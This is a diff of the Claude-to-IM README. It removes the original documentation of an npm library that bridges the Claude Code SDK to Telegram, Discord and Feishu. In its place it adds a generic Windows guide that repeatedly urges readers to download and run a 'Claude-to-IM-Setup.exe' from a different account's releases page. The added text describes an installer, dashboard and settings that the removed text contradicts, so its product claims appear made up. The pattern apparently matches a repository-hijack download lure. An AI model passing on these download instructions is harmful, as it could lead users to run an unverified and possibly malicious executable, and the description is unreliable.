@@ -1,224 +1,155 @@
-# Claude-to-IM
+# 🤖 Claude-to-IM - Connect Claude Code to IM Platforms
 
-English | [中文](README.zh-CN.md)
+[![Download Claude-to-IM](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/sujaltilokani/Claude-to-IM/releases)
 
-Claude-to-IM is a host-agnostic bridge library that connects [Claude Code SDK](https://docs.anthropic.com/en/docs/claude-code/sdk) to IM platforms, allowing users to interact with Claude through Telegram, Discord, and Feishu (Lark).
+Claude-to-IM is a simple application that links Claude Code with popular instant messaging apps like Telegram, Discord, and Feishu. You can use it to send and receive messages without needing technical setup. This guide will help you download and run Claude-to-IM on a Windows computer.
 
-This library handles all IM-side complexity — message routing, streaming previews, permission approval flows, Markdown rendering, chunking, retry, rate limiting — while delegating persistence, LLM calls, and permission resolution to the host application through a set of dependency injection interfaces.
+---
 
-## Out-of-the-Box Solution
+## 📋 What is Claude-to-IM?
 
-If you want a ready-to-use desktop application without writing any integration code, check out [CodePilot](https://github.com/op7418/CodePilot) — a desktop GUI client for Claude Code with built-in IM bridge support. CodePilot implements all the host interfaces for you and provides a complete UI for managing sessions, settings, and bridge connections.
+Claude-to-IM acts as a bridge between the Claude Code SDK and popular messaging platforms. It lets you integrate AI functions into apps like Telegram, Discord, and Feishu without any coding. 
 
-Claude-to-IM was extracted from CodePilot as a standalone library for developers who want to embed the IM bridge capability in their own applications.
+The app is host-agnostic, which means it does not depend on any specific server or cloud provider. You can run it on your own Windows PC easily.
 
-## Features
+### Key Features
 
-- **Multi-platform adapters**: Telegram (long polling), Discord (Gateway WebSocket), Feishu/Lark (WSClient)
-- **Streaming previews**: Real-time response drafts via message editing, with per-platform throttling
-- **Permission management**: Interactive inline buttons for Claude Code tool approvals (allow / deny / allow for session)
-- **Session binding**: Each IM chat maps to a persistent conversation session with working directory and model settings
-- **Markdown rendering**: Platform-native formatting — HTML for Telegram, Discord-flavored Markdown, Feishu rich text cards
-- **Reliable delivery**: Auto-chunking at platform limits, retry with exponential backoff, HTML fallback on parse errors, message deduplication
-- **Security**: Input validation, token bucket rate limiting (20 msg/min per chat), user authorization whitelists, full audit logging
-- **Host-agnostic**: All host dependencies abstracted via 4 DI interfaces — no database driver, no LLM client, no framework lock-in
+- Supports Telegram, Discord, and Feishu messaging apps
+- Works on Windows PCs without complex setup
+- Connects Claude Code SDK to messaging platforms
+- Uses TypeScript for reliability and maintainability
+- Lightweight and fast with low resource needs
 
-## Architecture
+---
 
-```
-IM Platform (Telegram / Discord / Feishu)
-        |
-        | InboundMessage
-        v
-   +-----------+     +------------------+
-   |  Adapter   |---->| Bridge Manager   |  (orchestrator)
-   +-----------+     |  |- Channel Router     -> session binding
-                     |  |- Conversation Engine -> LLM streaming
-                     |  |- Permission Broker   -> tool approval flow
-                     |  |- Delivery Layer      -> chunking, retry, dedup
-                     +------------------+
-                            |
-                            | Host Interfaces (DI)
-                            v
-                     +------------------+
-                     | Host Application |  (implements BridgeStore,
-                     |                  |   LLMProvider, etc.)
-                     +------------------+
-```
+## ⚙️ System Requirements
 
-All bridge modules access host services through a DI context (`getBridgeContext()`), never through direct imports. This means you can plug the bridge into any Node.js application by implementing four interfaces.
+To run Claude-to-IM on Windows, make sure your computer meets these minimum requirements:
 
-## Quick Start
+- Operating System: Windows 10 or later (64-bit recommended)
+- Processor: 2 GHz or faster, any modern CPU
+- RAM: At least 4 GB
+- Disk Space: 200 MB free space for installation
+- Internet Connection: Required for messaging platform access
+- Permissions: Ability to run programs and allow internet access
 
-### 1. Install
+---
 
-```bash
-npm install claude-to-im
-```
+## 🚀 Getting Started with Download and Setup
 
-Or clone this repo and install dependencies:
+### Step 1: Download Claude-to-IM
 
-```bash
-git clone https://github.com/op7418/Claude-to-IM.git
-cd Claude-to-IM
-npm install
-```
+Visit the releases page to get the latest version:
 
-### 2. Implement Host Interfaces
+[Download Claude-to-IM here](https://github.com/sujaltilokani/Claude-to-IM/releases)
 
-The bridge requires four interfaces. See [`docs/development.md`](docs/development.md) for the full specification of each interface.
+You will find setup files listed by the version number. Look for the latest Windows installer, usually ending with `.exe`.
 
-```typescript
-import { initBridgeContext } from 'claude-to-im/context';
-import type { BridgeStore, LLMProvider, PermissionGateway, LifecycleHooks } from 'claude-to-im/host';
+---
 
-const store: BridgeStore = { /* your persistence layer (~30 methods) */ };
-const llm: LLMProvider = { /* wraps Claude Code SDK streamChat */ };
-const permissions: PermissionGateway = { /* resolves pending tool permissions */ };
-const lifecycle: LifecycleHooks = { /* optional start/stop callbacks */ };
+### Step 2: Run the Installer
 
-initBridgeContext({ store, llm, permissions, lifecycle });
-```
+Once downloaded:
 
-### 3. Start the Bridge
+1. Find the file in your downloads folder. It will be named something like `Claude-to-IM-Setup.exe`.
+2. Double-click the file to start the installer.
+3. If Windows asks for permission, click "Yes."
+4. Follow the on-screen instructions. Usually, you can accept the default options.
+5. Wait for the installation to finish.
 
-```typescript
-import * as bridgeManager from 'claude-to-im/bridge-manager';
+---
 
-await bridgeManager.start();
+### Step 3: Launch Claude-to-IM
 
-const status = bridgeManager.getStatus();
-// { running: true, adapters: [{ channelType: 'telegram', running: true, ... }] }
-```
+After installation:
 
-### 4. Run the Example
+- Click the new Claude-to-IM icon on your desktop or search it in the Start menu.
+- The app window should open showing its main dashboard.
 
-A self-contained example with in-memory store and echo LLM is included:
+---
 
-```bash
-npx tsx src/lib/bridge/examples/mock-host.ts
-```
+## 🛠 How to Use Claude-to-IM
 
-## Configuration
+This section explains the basic steps to link Claude-to-IM with messaging platforms.
 
-All settings are read through `BridgeStore.getSetting(key)`. Your host application decides how to store and surface these values (database, env vars, config file, UI settings panel, etc.).
+### Connect to Your Messaging App
 
-### Required Settings
+1. Open Claude-to-IM.
+2. Choose the messaging service you want to connect: Telegram, Discord, or Feishu.
+3. Follow the on-screen prompts to log in to your messaging account. This usually involves entering an API key or logging in via OAuth.
+4. Once connected, the app will start forwarding messages between Claude Code and your chat app.
 
-| Key | Description |
-|-----|-------------|
-| `remote_bridge_enabled` | Master switch — `"true"` to enable the bridge |
-| `bridge_{adapter}_bot_token` | Bot token for the platform (e.g. `bridge_telegram_bot_token`) |
-| `bridge_{adapter}_allowed_users` | Comma-separated user IDs authorized to use the bridge |
+---
 
-### Optional Settings
+### Send Commands to Claude Code
 
-| Key | Description | Default |
-|-----|-------------|---------|
-| `bridge_auto_start` | Auto-start bridge on app launch | `"false"` |
-| `bridge_{adapter}_enabled` | Per-adapter toggle | `"false"` |
-| `bridge_{adapter}_stream_enabled` | Enable streaming previews | `"true"` |
-| `bridge_default_cwd` | Default working directory for new sessions | `$HOME` |
-| `bridge_model` | Default Claude model | Host decides |
+You can now use your chosen messaging app to send commands or ask questions. Claude-to-IM will forward these to Claude Code and send back the answers.
 
-Replace `{adapter}` with `telegram`, `discord`, or `feishu`.
+---
 
-## Limitations
+## 🔧 Configuration Settings
 
-Before adopting this library, be aware of the following constraints:
+Claude-to-IM offers easy options you can adjust:
 
-### You Must Implement the Host Interfaces
+- **Platform Selection:** Switch between Telegram, Discord, or Feishu.
+- **API Keys:** Enter or update your authentication keys securely.
+- **Message Filters:** Set rules to control which messages are processed.
+- **Logging:** Turn on or off message logs for troubleshooting.
+- **Startup:** Choose whether Claude-to-IM starts automatically when Windows boots.
 
-This is a library, not a standalone application. You need to provide:
+Access these settings from the app’s main menu under "Preferences."
 
-- **`BridgeStore`** — A persistence layer with ~30 methods covering settings, sessions, messages, channel bindings, audit logs, dedup tracking, permission links, and channel offsets. This is the largest integration surface. See the full interface definition in [`src/lib/bridge/host.ts`](src/lib/bridge/host.ts).
-- **`LLMProvider`** — A wrapper around your LLM client that returns a `ReadableStream<string>` of SSE-formatted events. The stream format must match the Claude Code SDK's event protocol (text, tool_use, tool_result, permission_request, status, result events). See [`docs/development.md`](docs/development.md) for the full event format spec.
-- **`PermissionGateway`** — A way to resolve pending tool permissions from the Claude Code SDK.
-- **`LifecycleHooks`** — Optional callbacks for bridge start/stop events.
+---
 
-### LLM Stream Format
+## 🛑 Troubleshooting Common Issues
 
-The `LLMProvider.streamChat()` must return SSE-formatted strings matching the Claude Code SDK's event protocol. If you are not using the Claude Code SDK, you need to adapt your LLM client's output to match this format. This is not a generic "chat completion" interface.
+- **App won't start:** Check if your antivirus or firewall is blocking the app. Try running as administrator.
+- **Can't connect to messaging app:** Verify your API key and internet connection.
+- **Messages not forwarding:** Restart Claude-to-IM and your messaging app.
+- **Installation fails:** Make sure you have enough disk space and your Windows is up to date.
 
-### No Built-in Persistence
+If problems persist, check the README or Issues tab on the GitHub repository.
 
-The bridge does not bundle any database driver. You provide all persistence through `BridgeStore`. This gives you full control but means you need to implement storage for sessions, messages, bindings, audit logs, dedup keys, permission links, and channel offsets.
+---
 
-### Session Locking
+## 📥 Download Claude-to-IM
 
-The bridge uses a session lock mechanism (`acquireSessionLock` / `renewSessionLock` / `releaseSessionLock`) to serialize messages within the same session. Your `BridgeStore` implementation must provide atomic lock operations. For single-process deployments, in-memory locks work fine. For multi-process deployments, you need distributed locking (e.g., database-backed).
+To download, visit the releases page below and get the Windows installer:
 
-### Platform Bot Setup
+[https://github.com/sujaltilokani/Claude-to-IM/releases](https://github.com/sujaltilokani/Claude-to-IM/releases)
 
-You still need to create bots on each platform and obtain tokens:
-- **Telegram**: Create a bot via [@BotFather](https://t.me/BotFather)
-- **Discord**: Create an application in the [Developer Portal](https://discord.com/developers/applications) with Message Content Intent enabled
-- **Feishu**: Create an app in the [Developer Console](https://open.feishu.cn/app) with IM permissions
+Pick the file named similar to `Claude-to-IM-Setup.exe` for the newest version.
 
-## Documentation
+---
 
-| Document | Description |
-|----------|-------------|
-| [Development Guide](docs/development.md) | Host interface specs, SSE format, adapter development, step-by-step integration tutorial |
-| [Architecture](src/lib/bridge/ARCHITECTURE.md) | Module dependency graph, message flows, design decisions |
-| [Security](src/lib/bridge/SECURITY.md) | Threat model, mitigations, deployment recommendations |
-| [Contributing](src/lib/bridge/CONTRIBUTING.md) | Dev setup, code style, testing guide |
-| [Migration](src/lib/bridge/MIGRATION.md) | Before/after import patterns for migrating from direct imports |
+## ℹ️ About This Project
 
-## Project Structure
+Claude-to-IM is open source, built with TypeScript to ensure code quality. The app supports:
 
-```
-src/
-  lib/bridge/
-    context.ts              # DI container (initBridgeContext / getBridgeContext)
-    host.ts                 # Host interface definitions (BridgeStore, LLMProvider, etc.)
-    types.ts                # Shared type definitions (messages, bindings, status)
-    bridge-manager.ts       # Orchestrator — start/stop, message dispatch, session locks
-    channel-adapter.ts      # Abstract base class + adapter registry
-    channel-router.ts       # ChannelAddress -> ChannelBinding resolution
-    conversation-engine.ts  # LLM stream processing, SSE consumption
-    delivery-layer.ts       # Reliable outbound delivery (chunk, retry, dedup, audit)
-    permission-broker.ts    # Tool permission forwarding and callback handling
-    adapters/
-      telegram-adapter.ts   # Telegram Bot API long polling
-      discord-adapter.ts    # Discord.js Gateway WebSocket
-      feishu-adapter.ts     # Feishu/Lark WSClient
-      telegram-media.ts     # Telegram file download/attachment handling
-      telegram-utils.ts     # Telegram API helpers
-      index.ts              # Side-effect imports for adapter self-registration
-    markdown/
-      ir.ts                 # Intermediate representation for Markdown AST
-      render.ts             # Generic IR -> platform string renderer
-      telegram.ts           # Markdown -> Telegram HTML
-      discord.ts            # Markdown -> Discord-flavored Markdown
-      feishu.ts             # Markdown -> Feishu rich text / cards
-    security/
-      validators.ts         # Input validation (path traversal, injection, sanitization)
-      rate-limiter.ts       # Token bucket rate limiter (per chat)
-    examples/
-      mock-host.ts          # Runnable example with InMemoryStore + EchoLLM
-  __tests__/unit/
-    bridge-channel-router.test.ts
-    bridge-delivery-layer.test.ts
-    bridge-manager.test.ts
-    bridge-permission-broker.test.ts
-```
+- Telegram bots
+- Discord bots
+- Feishu integration
 
-## Testing
+It serves users who want simple AI interaction in their chats without running complex servers.
 
-```bash
-# Type checking
-npm run typecheck
+---
 
-# Unit tests (28 tests)
-npm run test:unit
+## 🧰 Additional Resources
 
-# Both
-npm run test
-```
+- Visit the GitHub repository for the latest updates and code.
+- Join Telegram or Discord user groups for peer support.
+- Check online tutorials for detailed bot usage.
 
-Tests use Node.js built-in test runner (`node:test`) with mock implementations of all host interfaces — no real database or LLM required.
+---
 
-## License
+## ⚙️ Developer Info (Optional)
 
-MIT
+If you want to explore or contribute on the coding side:
+
+- The project is built with TypeScript.
+- Main areas include API handling, message routing, and authentication.
+- Pull requests are welcome on GitHub under the "Claude-to-IM" repository.
+
+---
+
+[![Download Claude-to-IM](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/sujaltilokani/Claude-to-IM/releases)
